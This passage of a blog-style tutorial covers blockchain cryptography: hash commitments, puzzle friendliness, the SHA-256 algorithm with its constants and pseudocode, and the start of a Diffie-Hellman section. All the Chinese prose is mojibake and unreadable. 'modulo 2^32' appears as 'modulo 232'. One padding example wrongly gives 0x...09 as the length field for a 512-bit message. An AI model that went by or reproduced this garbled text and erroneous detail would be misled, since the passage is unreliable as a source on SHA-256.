<p>å¦‚æœæƒ³å¯¹head&#x2F;tailçš„ç»“æœè¿›è¡Œéšè—ï¼Œæœ‰ä»€ä¹ˆåŠæ³•å—ï¼Ÿ</p>
<p>ç­”æ¡ˆå°±æ˜¯é€šè¿‡å¯¹ç®€å•çš„â€headâ€å’Œâ€tailâ€åé¢è·Ÿä¸Šä¸€ä¸ªéšæœºæ€§è¾ƒå¼ºçš„ä¸²rï¼Œè¿™æ ·å°±èƒ½å®ç°hidingã€‚è­¬å¦‚ï¼Œåé¢è·Ÿä¸Šé•¿åº¦ä¸º256bitçš„ä¸²ï¼Œè¿™æ ·å› ä¸ºrçš„éšæœºæ€§è¶³å¤Ÿå¼ºï¼Œå³ä½¿headå’Œtailå¾ˆç®€å•ï¼Œä¹Ÿæœ‰è¶³å¤Ÿçš„éšè—æ€§ã€‚</p>
<p>hidingçš„åº”ç”¨:</p>
<blockquote>
<p>commitmentï¼ˆæ‰¿è¯ºï¼‰ã€‚æ‰¿è¯ºçš„åœºæ™¯ï¼Œè­¬å¦‚ï¼Œä¸–ç•Œæ¯é¢„æµ‹ç»“æœï¼Œæ¯ä¸ªäººéƒ½æŠŠè‡ªå·±é¢„æµ‹ç»“æœæ”¾åœ¨ä¿¡å°é‡Œï¼Œå¹¶ä¸”å°ä¸Šä¿¡å°ï¼Œæ”¾åœ¨æ¡Œä¸Šã€‚è¿™ç›¸å½“äºåšå‡ºäº†ä¸€ä¸ªæ‰¿è¯ºã€‚ç„¶åä¸–ç•Œæ¯ç»“æŸåï¼Œå¤§å®¶æ‹†å¼€ä¿¡å°ï¼Œçœ‹çœ‹å½“åˆè°é¢„æµ‹å¾—æœ€å‡†ç¡®ã€‚</p>
<p>åœ¨å¯†ç å­¦ä¸­ï¼Œå¯ä»¥è¿™æ ·è®¡ç®—ï¼š</p>
<p>com :&#x3D; commit(msg, nonce), nonceæ˜¯ä¸€ä¸ªéšæœºçš„ç§˜å¯†çš„æ•°å­—ï¼ˆè­¬å¦‚256ä½ï¼‰ï¼›ç„¶åå…¬å¼€comï¼›ç›¸å½“äºæŠŠå…¬å¸ƒäº†ä¸€ä¸ªå¯†å°çš„ä¿¡å°ï¼›å¤§å®¶éƒ½çŸ¥é“åšå‡ºäº†æ‰¿è¯ºï¼Œä½†æ˜¯å…·ä½“å€¼æ˜¯ä»€ä¹ˆè¿˜æ²¡æœ‰å…¬å¼€</p>
<p>verify(com,msg,nonce)ï¼Œå¦‚æœè¦æ£€éªŒï¼Œåˆ™ç”¨æˆ·æä¾›åŸå§‹çš„msgå’Œnonceï¼Œé€šè¿‡åŒæ ·çš„æ–¹æ³•è®¡ç®—ï¼Œçœ‹comæ˜¯å¦å’Œcommitè®¡ç®—å‡ºæ¥çš„ç»“æœç›¸åŒ</p>
<p>ï¼ˆè€ƒè™‘ä¸€ä¸‹ï¼Œä¸ºä»€ä¹ˆéœ€è¦ä¸€ä¸ªNonceï¼Ÿï¼‰</p>
<p>è¿™é‡Œçš„commitå°±å¯ä»¥ä½¿ç”¨å“ˆå¸Œå‡½æ•°æ¥å®ç°ã€‚</p>
</blockquote>
<h3 id="puzzle-friendliness"><a href="#puzzle-friendliness" class="headerlink" title="puzzle friendliness"></a>puzzle friendliness</h3><p>å¯¹äºæ¯ä¸€ä¸ªå¯èƒ½çš„ nä½è¾“å‡º $y$,å¦‚æœ $k$æ˜¯éšæœºæ€§å¾ˆå¼ºçš„å€¼ï¼ˆè­¬å¦‚é•¿åº¦ä¸º256ä½çš„éšæœºäºŒè¿›åˆ¶ä¸²ï¼‰ï¼Œé‚£ä¹ˆæ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„ $x$ä½¿å¾—  $H(k||x)&#x3D;y$ æ˜¯ä¸å¯èƒ½æ˜¾è‘—åœ°ä½äº  $2^n$çš„æ—¶é—´å¤æ‚åº¦ã€‚</p>
<p>è¿™ä¸ªç‰¹ç‚¹å¼ºè°ƒçš„æ˜¯ï¼Œå¦‚æœç»™å®šç‰¹æ®Šçš„å“ˆå¸Œç»“æœ $y$ï¼Œå¹¶ä¸”è¾“å…¥ä¸­æœ‰ä¸€éƒ¨åˆ†éšæœºæ€§å¾ˆå¼ºçš„$k$ï¼Œé‚£ä¹ˆæ‰¾åˆ°è¾“å…¥çš„å¦ä¸€ä¸ªéƒ¨åˆ† $x$ ä½¿å¾—å“ˆå¸Œçš„ç»“æœç­‰äº$y$ï¼Œé‚£ä¹ˆå°±åªèƒ½ä¾é æš´åŠ›æœç´¢ã€‚</p>
<p>åº”ç”¨ï¼š search puzzle ï¼›åŒºå—é“¾ä¸­çš„å·¥ä½œé‡è¯æ˜ã€‚</p>
<h2 id="å“ˆå¸Œç®—æ³•SHA-256"><a href="#å“ˆå¸Œç®—æ³•SHA-256" class="headerlink" title="å“ˆå¸Œç®—æ³•SHA-$256$"></a>å“ˆå¸Œç®—æ³•SHA-$256$</h2><ol>
<li>512-448 &#x3D; 64  å­—ç¬¦ä¸²é•¿åº¦é™å®š$2^{64}$, data + 1 + nä¸ª0 &#x3D; 448mod512,ä¾‹å¦‚dataæœ‰440bits,åˆ™è¡¥ä¸€ä¸ª1,ç„¶åè¡¥7ä¸ªé›¶;dataæœ‰952bits,åˆ™è¡¥ä¸€ä¸ª1,ç„¶åè¡¥7ä¸ªé›¶;dataæœ‰448bits,åˆ™è¡¥ä¸€ä¸ª1,ç„¶åè¡¥511ä¸ª0;data447bits,åˆ™è¡¥ä¸€ä¸ª1,ä¸ç”¨è¡¥0.æœ€åä¸€ä¸ªå—å‰©ä¸‹64ä½,å°±æ˜¯$2^x$ &#x3D; len(data),ä¾‹å¦‚dataä½512bits,åˆ™æœ€å64ä½ä¸º0x 0000000000000009</li>
<li>æŠŠ512bitsæ‹†æˆ16*32bits,æ‰©å±•æˆ64ä¸ª32bitsçš„w(w[i] :&#x3D; w[i-16] + s0 + w[i-7] + s1),kæ˜¯64ä¸ªå¸¸é‡(è¿™64ä¸ªå¸¸é‡æ¥è‡ªäºè‡ªç„¶æ•°ä¸­å‰64ä¸ªè´¨æ•°{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97â€¦}ï¼Œå–ç«‹æ–¹æ ¹ï¼Œå‰32bitè€Œæ¥ã€‚)</li>
<li>ç¬¬ä¸€è½®æœ‰8ä¸ªåˆå§‹hashå€¼(8ä¸ªæ•°æ˜¯å‰<strong>8ä¸ªç´ æ•°(2,3,5,7,11,13,17,19)å–å¹³æ–¹æ ¹</strong>ï¼Œå‰32ä½å°æ•°),ç„¶åå¯¹è¿™64ä¸ªæ— ç¬¦å·å‹æ•´æ•°è¿›è¡ŒhashåŠ å¯†,åŠ å¯†64è½®,ç„¶åä¼šå¾—åˆ°8ä¸ªhashå€¼,è¿™8ä¸ªhashå€¼ä½œä¸ºä¸‹ä¸€è½®çš„è¾“å…¥.</li>
</ol>
<p>SHA-256æ˜¯SHA-2ä¸­çš„ä¸€ä¸ªç®—æ³•ã€‚SHA-2ï¼Œä¹Ÿå³ç¬¬äºŒä»£å®‰å…¨æ•£åˆ—ç®—æ³•ï¼ˆSecure Hash Algorithm 2ï¼‰ï¼Œç”±ç¾å›½å›½å®¶å®‰å…¨å±€2001å¹´å…¬å¸ƒçš„æ ‡å‡†å“ˆå¸Œç®—æ³•ï¼Œæ˜¯SHA-1çš„åç»§ã€‚</p>
<p>SHA-2ä¸‹åŒ…æ‹¬å…­ä¸ªä¸åŒçš„ç®—æ³•æ ‡å‡†ï¼šSHA-224ã€SHA-256ã€SHA-384ã€SHA-512ã€SHA-512&#x2F;224ã€SHA-512&#x2F;256ã€‚è¿™äº›ä¸åŒçš„ç®—æ³•ä½¿ç”¨ä¸åŒç”Ÿæˆæ‘˜è¦çš„é•¿åº¦ ã€å¾ªç¯è¿è¡Œçš„æ¬¡æ•°ï¼Œä½†ç®—æ³•çš„åŸºæœ¬ç»“æ„æ˜¯ä¸€è‡´çš„ã€‚ç°åœ¨å·²çŸ¥SHA-2å®¹æ˜“å—åˆ°é•¿åº¦æ‰©å±•æ”»å‡»ï¼Œæ‰€ä»¥æ¨èä½¿ç”¨SHA-3æ¥å–ä»£å®ƒã€‚</p>
<p>å¯¹äºä»»æ„é•¿åº¦çš„æ¶ˆæ¯ï¼ŒSHA256éƒ½äº§ç”Ÿ256bité•¿çš„å“ˆå¸Œå€¼ï¼Œä¹Ÿå³32å­—èŠ‚ï¼Œæˆ–è€…64ä½çš„16è¿›åˆ¶æ•°ï¼Œæˆ–è€…8ä¸ª8ä½çš„16æœºåˆ¶æ•° ã€‚:)</p>
<p>SHA-256çš„è®¡ç®—è¿‡ç¨‹:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233991.jpg" alt="preview"></p>
<p align="center">æ¥è‡ªwiki,SHA2çš„ä¸€è½®è®¡ç®—</p>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233992.jpg" alt="img"></p>
<p>è¿™é‡ŒAï½Hå…±æœ‰8ä¸ªï¼Œåˆå§‹å€¼åˆ†åˆ«æ˜¯</p>
<p>h0 :&#x3D; 0x6a09e667<br>h1 :&#x3D; 0xbb67ae85<br>h2 :&#x3D; 0x3c6ef372<br>h3 :&#x3D; 0xa54ff53a<br>h4 :&#x3D; 0x510e527f<br>h5 :&#x3D; 0x9b05688c<br>h6 :&#x3D; 0x1f83d9ab<br>h7 :&#x3D; 0x5be0cd19</p>
<p>çœ‹ä¸€ä¸‹ï¼Œåˆ†åˆ«æ˜¯8ä¸ª16è¿›åˆ¶æ•°ï¼Œæ‰€ä»¥æ€»å…±æœ‰256ä½ï¼Œè¿™ä¸ªå°±å«åšåˆå§‹å‘é‡ï¼ˆIVï¼‰ã€‚è¿™8ä¸ªæ•°æ˜¯å‰<strong>8ä¸ªç´ æ•°(2,3,5,7,11,13,17,19)å–å¹³æ–¹æ ¹</strong>ï¼Œå‰32ä½å°æ•°ã€‚æœ€ç»ˆç”Ÿæˆçš„å“ˆå¸Œå€¼ä¹Ÿæ˜¯è¿™ä¹ˆé•¿ï¼Œæ‰€ä»¥ï¼Œæ¯ä¸€è½®çš„è®¡ç®—å°±æ˜¯å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæ›´æ–°è¿™8ä¸ªå€¼ã€‚</p>
<p>é‚£æ€ä¹ˆæ›´æ–°å‘¢ï¼Ÿ</p>
<p><strong>æ¯ä¸€è½®è®¡ç®—64æ¬¡ã€‚</strong>åœ¨ä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†Aï½Hå¤–ï¼Œæœ‰ä¸¤ä¸ªè¾“å…¥ï¼Œåˆ†åˆ«æ˜¯ $w_t$å’Œ$k_t$ ã€‚ä¹Ÿå³æ¯ä¸€è½®ä¸­æœ‰64ä¸ª $w$ï¼Œä»¥åŠ64ä¸ª $k$ ã€‚æ¯ä¸ª $w$åº¦ä¸º32bitï¼Œä¹Ÿå³4ä¸ªå­—èŠ‚ã€‚64ä¸ª $w$æ¥è‡ªäºå“ˆå¸Œå‡½æ•°çš„è¾“å…¥ï¼Œä¹Ÿå³ï¼Œå¯¹äºè¾“å…¥ï¼Œä¸è®ºé•¿çŸ­ï¼Œé•¿çš„å°±åˆ†æˆæ¯512bitä¸€ä¸ªå—ï¼ˆ64ä¸ªå­—èŠ‚ï¼‰ï¼ŒçŸ­çš„è¡¥è¶³512bitã€‚è¿™64ä¸ªå­—èŠ‚æ„æˆäº†å‰16ä¸ª $w$,åé¢çš„48ä¸ª $w$è¿‡å‰é¢çš„16ä¸ªç”Ÿæˆã€‚</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i from <span class="number">16</span> to <span class="number">63</span></span><br><span class="line">        s0 := (w[i<span class="number">-15</span>] rightrotate <span class="number">7</span>) xor (w[i<span class="number">-15</span>] rightrotate <span class="number">18</span>) xor (w[i<span class="number">-15</span>] rightshift <span class="number">3</span>)</span><br><span class="line">        s1 := (w[i<span class="number">-2</span>] rightrotate <span class="number">17</span>) xor (w[i<span class="number">-2</span>] rightrotate <span class="number">19</span>) xor (w[i<span class="number">-2</span>] rightshift <span class="number">10</span>)</span><br><span class="line">        w[i] := w[i<span class="number">-16</span>] + s0 + w[i<span class="number">-7</span>] + s1</span><br></pre></td></tr></table></figure>



<p><strong>64ä¸ª $k$æ˜¯64ä¸ªå¸¸é‡</strong>ï¼Œ</p>
<p>k[0..63] :&#x3D;<br>0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5, 0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174, 0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,<br>0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967, 0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85, 0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,<br>0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3, 0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</p>
<p>è¿™64ä¸ªå¸¸é‡æ¥è‡ªäºè‡ªç„¶æ•°ä¸­å‰64ä¸ªè´¨æ•°{2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97â€¦}ï¼Œå–ç«‹æ–¹æ ¹ï¼Œå‰32bitè€Œæ¥ã€‚</p>
<p>ç„¶åæ¯ä¸€æ¬¡çš„è®¡ç®—ï¼Œ</p>
<p>h :&#x3D; g<br>g :&#x3D; f<br>f :&#x3D; e<br>e :&#x3D; d <strong>+</strong> temp1<br>d :&#x3D; c<br>c :&#x3D; b<br>b :&#x3D; a<br>a :&#x3D; temp1 <strong>+</strong> temp2</p>
<p>å¯ä»¥çœ‹ä¸‹ä¼ªä»£ç ï¼š</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Note: All variables are unsigned 32 bits and wrap modulo 232 when calculating</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize variables</span><br><span class="line">(first 32 bits of the fractional parts of the square roots of the first 8 primes 2..19):</span><br><span class="line">h0 := 0x6a09e667</span><br><span class="line">h1 := 0xbb67ae85</span><br><span class="line">h2 := 0x3c6ef372</span><br><span class="line">h3 := 0xa54ff53a</span><br><span class="line">h4 := 0x510e527f</span><br><span class="line">h5 := 0x9b05688c</span><br><span class="line">h6 := 0x1f83d9ab</span><br><span class="line">h7 := 0x5be0cd19</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Initialize table of round constants</span><br><span class="line">(first 32 bits of the fractional parts of the cube roots of the first 64 primes 2..311):</span><br><span class="line">k[0..63] :=</span><br><span class="line">   0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,</span><br><span class="line">   0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,</span><br><span class="line">   0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,</span><br><span class="line">   0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,</span><br><span class="line">   0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,</span><br><span class="line">   0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,</span><br><span class="line">   0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,</span><br><span class="line">   0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pre-processing:</span><br><span class="line">append the bit &#x27;1&#x27; to the message</span><br><span class="line">append k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message</span><br><span class="line">    length (in bits) is congruent to 448(mod 512)</span><br><span class="line">append length of message (before pre-processing), in bits, as 64-bit big-endian integer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Process the message in successive 512-bit chunks:</span><br><span class="line">break message into 512-bit chunks</span><br><span class="line">for each chunk</span><br><span class="line">    break chunk into sixteen 32-bit big-endian words w[0..15]</span><br><span class="line"></span><br><span class="line">    Extend the sixteen 32-bit words into sixty-four 32-bit words:</span><br><span class="line">    for i from 16 to 63</span><br><span class="line">        s0 := (w[i-15] rightrotate 7) xor (w[i-15] rightrotate 18) xor(w[i-15] rightshift 3)</span><br><span class="line">        s1 := (w[i-2] rightrotate 17) xor (w[i-2] rightrotate 19) xor(w[i-2] rightshift 10)</span><br><span class="line">        w[i] := w[i-16] + s0 + w[i-7] + s1</span><br><span class="line"></span><br><span class="line">    Initialize hash value for this chunk:</span><br><span class="line">    a := h0</span><br><span class="line">    b := h1</span><br><span class="line">    c := h2</span><br><span class="line">    d := h3</span><br><span class="line">    e := h4</span><br><span class="line">    f := h5</span><br><span class="line">    g := h6</span><br><span class="line">    h := h7</span><br><span class="line"></span><br><span class="line">    Main loop:</span><br><span class="line">    for i from 0 to 63</span><br><span class="line">        s0 := (a rightrotate 2) xor (a rightrotate 13) xor(a rightrotate 22)</span><br><span class="line">        maj := (a and b) xor (a and c) xor(b and c)</span><br><span class="line">        t2 := s0 + maj</span><br><span class="line">        s1 := (e rightrotate 6) xor (e rightrotate 11) xor(e rightrotate 25)</span><br><span class="line">        ch := (e and f) xor ((not e) and g)</span><br><span class="line">        t1 := h + s1 + ch + k[i] + w[i]</span><br><span class="line">        h := g</span><br><span class="line">        g := f</span><br><span class="line">        f := e</span><br><span class="line">        e := d + t1</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := a</span><br><span class="line">        a := t1 + t2</span><br><span class="line"></span><br><span class="line">    Add this chunk&#x27;s hash to result so far:</span><br><span class="line">    h0 := h0 + a</span><br><span class="line">    h1 := h1 + b</span><br><span class="line">    h2 := h2 + c</span><br><span class="line">    h3 := h3 + d</span><br><span class="line">    h4 := h4 + e</span><br><span class="line">    h5 := h5 + f</span><br><span class="line">    h6 := h6 + g</span><br><span class="line">    h7 := h7 + h</span><br><span class="line"></span><br><span class="line">Produce the final hash value (big-endian):</span><br><span class="line">digest = hash = h0 append h1 append h2 append h3 append h4 append h5 append h6 append h7</span><br></pre></td></tr></table></figure>

<p>å…³äºçŸ­çš„è¾“å…¥å¦‚ä½•è¡¥è¶³ä¹Ÿæœ‰ä¸€äº›ç»†èŠ‚ï¼Œåœ¨è¾“å…¥æœ«å°¾è¿›è¡Œå¡«å……ï¼Œä½¿è¾“å…¥é•¿åº¦åœ¨å¯¹512å–æ¨¡ä»¥åçš„ä½™æ•°æ˜¯448ã€‚å¡«å……çš„å…·ä½“è¿‡ç¨‹ï¼šå…ˆè¡¥ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä¸º1ï¼Œç„¶åéƒ½è¡¥0ï¼Œç›´åˆ°é•¿åº¦æ»¡è¶³å¯¹512å–æ¨¡åä½™æ•°æ˜¯448ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¿¡æ¯å¿…é¡»è¿›è¡Œå¡«å……ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿é•¿åº¦å·²ç»æ»¡è¶³å¯¹512å–æ¨¡åä½™æ•°æ˜¯448ï¼Œè¡¥ä½ä¹Ÿå¿…é¡»è¦è¿›è¡Œï¼Œè¿™æ—¶è¦å¡«å……512ä¸ªæ¯”ç‰¹ã€‚å› æ­¤ï¼Œå¡«å……æ˜¯è‡³å°‘è¡¥ä¸€ä½ï¼Œæœ€å¤šè¡¥512ä½ã€‚ä¸ºä»€ä¹ˆä½™æ•°æ˜¯448å‘¢?å› ä¸ºï¼Œè¿˜æœ‰éœ€è¦æœ‰64ä½çš„æ•°æ®è¡¨ç¤ºåŸå§‹è¾“å…¥çš„é•¿åº¦ï¼ŒåŠ ä¸Šè¿™64bitçš„é•¿åº¦ä¿¡æ¯448+64&#x3D;512ï¼Œåˆšå¥½512ä½ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233993.jpg" alt="preview">Merkle-Damgardæ„é€ </p>
<p><strong>åœ¨åŒºå—é“¾ä¸­çš„åº”ç”¨</strong></p>
<p>å“ˆå¸Œåœ¨åŒºå—é“¾ä¸­çš„ç”¨å¤„åŒ…æ‹¬ï¼š</p>
<ol>
<li>åˆ©ç”¨puzzle-friendlinessçš„å·¥ä½œé‡è¯æ˜ï¼Œä¹Ÿå³ï¼Œè¦æ±‚ç”Ÿæˆä¸€ä¸ªæ–°åŒºå—æ—¶ï¼Œå“ˆå¸Œå€¼ä¸€å®šè¦æ˜¯ä»¥ä¸€å®šæ•°é‡çš„è¿ç»­çš„0å¼€å§‹çš„ï¼›</li>
<li>å¯¹æ¯ä¸ªåŒºå—çš„å†…å®¹è¿›è¡Œå“ˆå¸Œï¼Œåé¢çš„åŒºå—ç›¸å½“äºä¸€ç›´åœ¨å¯¹å‰é¢çš„åŒºå—è¿›è¡Œå“ˆå¸Œï¼Œæ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼Œå¦‚æœä¸€ä¸ªåŒºå—ä¹‹åå¦‚æœè·Ÿä¸Šå…¶ä»–6ä¸ªåŒºå—ä¹‹åï¼Œä¸€èˆ¬è®¤ä¸ºè¯¥åŒºå—çš„å†…å®¹å·²ç»è¢«å…¬è®¤äº†ï¼Œä¸å¯æ›´æ”¹ã€‚</li>
</ol>
<p>å‚è€ƒæ–‡çŒ®ï¼š</p>
<p>ã€1ã€‘<a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Block_hashing_algorithm">Block hashing algorithm</a></p>
<p>ã€2ã€‘<a href="https://link.zhihu.com/?target=https://lopp.net/pdf/princeton_bitcoin_book.pdf">https://lopp.net/pdf/princeton_bitcoin_book.pdf</a></p>
<p>ã€3ã€‘<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/SHA-2">SHA-2 - Wikipedia</a></p>
<p>ã€4ã€‘<a href="https://link.zhihu.com/?target=https://blog.csdn.net/u011583927/article/details/80905740">SHA256ç®—æ³•åŸç†è¯¦è§£ - CSDNåšå®¢</a></p>
<h1 id="åŒºå—é“¾æŠ€æœ¯4-å¯†ç å­¦æŒ‡éå¯¹ç§°åŠ å¯†"><a href="#åŒºå—é“¾æŠ€æœ¯4-å¯†ç å­¦æŒ‡éå¯¹ç§°åŠ å¯†" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯4:å¯†ç å­¦æŒ‡éå¯¹ç§°åŠ å¯†"></a>åŒºå—é“¾æŠ€æœ¯4:å¯†ç å­¦æŒ‡éå¯¹ç§°åŠ å¯†</h1><h2 id="éå¯¹ç§°åŠ å¯†"><a href="#éå¯¹ç§°åŠ å¯†" class="headerlink" title="éå¯¹ç§°åŠ å¯†"></a>éå¯¹ç§°åŠ å¯†</h2><p>å¯¹ç§°å¯†é’¥çš„é—®é¢˜ä¸»è¦åœ¨äºï¼š</p>
<ol>
<li>å…±åŒçš„å¯†é’¥çš„åå•†ã€‚ç›´æ¥çš„é¢å¯¹é¢åå•†å¯èƒ½æ˜¯ä¸ç°å®çš„ï¼Œè€Œä»»ä½•å…¶ä»–æ–¹æ³•éƒ½æœ‰å¯èƒ½æ³„éœ²ï¼›</li>
<li>å¯†é’¥çš„ç®¡ç†ã€‚æœ€å¥½å¯¹äºæ¯ä¸ªç”¨æˆ·çš„æ¯æ¬¡é€šä¿¡éƒ½ä½¿ç”¨ä¸åŒçš„å¯†é’¥ï¼›</li>
<li>å¯¹ç§°åŠ å¯†ç®—æ³•ä¸èƒ½æä¾›èº«ä»½éªŒè¯ï¼Œè€Œåœ¨ç”µå­å•†åŠ¡ä¸­ï¼Œç”¨æˆ·å¿…é¡»è¦ç¡®è®¤è‡ªå·±éšç§æ•°æ®çš„æ¥æ”¶æ–¹æ˜¯çœŸæ­£çš„ç½‘ç«™ï¼›</li>
</ol>
<h3 id="DHç®—æ³•"><a href="#DHç®—æ³•" class="headerlink" title="DHç®—æ³•"></a>DHç®—æ³•</h3><p>éå¯¹ç§°åŠ å¯†çš„å‘å±•èµ·æºäº1976å¹´çš„Diffie-Hellmanå¯†é’¥äº¤æ¢ç®—æ³•ã€‚DHå®é™…ä¸Šå¹¶ä¸æ˜¯ä¸€ç§åŠ å¯†åè®®ï¼Œå®ƒå¯ä»¥è®©åŒæ–¹åœ¨å®Œå…¨æ²¡æœ‰å¯¹æ–¹ä»»ä½•é¢„å…ˆä¿¡æ¯çš„æ¡ä»¶ä¸‹é€šè¿‡ä¸å®‰å…¨çš„ä¿¡é“å°±å¯†é’¥è¾¾æˆä¸€è‡´ï¼Œè¿™ä¸ªå¯†é’¥å¯ä»¥åœ¨åç»­çš„é€šä¿¡ä¸­ä½œä¸ºå¯¹ç§°å¯†é’¥æ¥åŠ å¯†ã€‚</p>
<p>DHç®—æ³•è¿‡ç¨‹:</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233994.jpg" alt="preview"></p>
<p>DHåå•†è¿‡ç¨‹ï¼ŒAliceå’ŒBobé¦–å…ˆæŒ‘é€‰ä¸€ä¸ªé¢œè‰²ï¼ˆé»„è‰²ï¼‰ï¼Œè¿™ä¸ªé¢œè‰²æ˜¯å¯ä»¥å…¬å¼€çš„ï¼ˆæ¯æ¬¡é€šä¿¡ä¸åŒï¼‰ï¼›ç„¶åå†å„è‡ªæŒ‘é€‰ä¸€ä¸ªç§˜å¯†çš„é¢œè‰²ï¼ˆAliceæ©™è‰²ï¼ŒBobé’è‰²ï¼‰ã€‚ç„¶åAliceå’ŒBobå„è‡ªå°†è‡ªå·±çš„ç§˜å¯†é¢œè‰²å’Œé»„è‰²è¿›è¡Œæ··åˆï¼Œå¾—åˆ°äº†å¦å¤–çš„ä¸¤ä¸ªé¢œè‰²ï¼ˆAliceæ©™è¤è‰²ï¼ŒBobæ·¡è“è‰²ï¼‰ã€‚Aliceå’ŒBobåˆ†åˆ«å°†è‡ªå·±çš„é¢œè‰²å‘ç»™å¯¹æ–¹ã€‚Aliceå’ŒBobåœ¨æ”¶åˆ°å¯¹æ–¹å‘æ¥çš„é¢œè‰²åï¼Œå†åˆ†åˆ«å’Œè‡ªå·±çš„é¢œè‰²ç›¸æ··åˆï¼Œæ­¤æ—¶ï¼Œä¸¤äººå¾—åˆ°äº†ä¸€ä¸ªç›¸åŒçš„é¢œè‰²ï¼ˆé»„è¤è‰²ï¼‰ã€‚</p>
<p>åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ”»å‡»è€…Eveå¯ä»¥ä¸€ç›´ç›‘å¬ç½‘ç»œï¼Œå¹¶ä¸”è·å¾—Aliceå’ŒBobåœ¨ç½‘ç»œä¸Šäº¤æ¢çš„æ‰€æœ‰ä¿¡æ¯ã€‚ä¹Ÿå³ï¼Œå¯ä»¥è·å¾—é»„è‰²ã€æ©™è¤è‰²ã€æ·¡è“è‰²è¿™äº›ä¿¡æ¯ã€‚é˜»æ­¢Eveè·å¾—æœ€ç»ˆçš„é»„è¤è‰²çš„æ˜¯Aliceå’ŒBobåˆ†åˆ«æŒ‘é€‰çš„ç§˜å¯†é¢œè‰²ï¼Œæ©™è‰²å’Œé’è‰²ã€‚ä¹Ÿå³ï¼Œéœ€è¦èƒ½å¤Ÿè¯æ˜ï¼Œå³ä½¿Eveå¾—åˆ°äº†é»„è‰²å’Œæ©™è¤è‰²ï¼ŒEveä¹Ÿä¸èƒ½æ¨å¯¼å‡ºAliceçš„ç§˜å¯†é¢œè‰²ã€‚</p>
<p>åœ¨æ•°å­¦ä¸Šï¼ŒDHç®—æ³•çš„æœ‰æ•ˆæ€§ä¾èµ–äºè®¡ç®—ç¦»æ•£å¯¹æ•°çš„éš¾åº¦ã€‚ä¹Ÿå³ï¼Œå½“å·²çŸ¥å¤§ç´ æ•° $p$ å’Œå®ƒçš„ä¸€ä¸ªåŸæ ¹ï¼ˆprimitive rootï¼‰$g$ ï¼Œå¯¹äºç»™å®šçš„ $b$ï¼Œè¦è®¡ç®—æŒ‡æ•° $i$ï¼Œæ˜¯éå¸¸å›°éš¾çš„ï¼ˆæš´åŠ›ç ´è§£ï¼‰ï¼Œè€Œç»™å®š$i$,è®¡ç®—$b$æ˜¯éå¸¸å®¹æ˜“çš„</p>
<p>å†ç”¨ä¸€ä¸ªå…·ä½“çš„ä¾‹å­æ¥è§£é‡ŠDH:</p>
<ol>
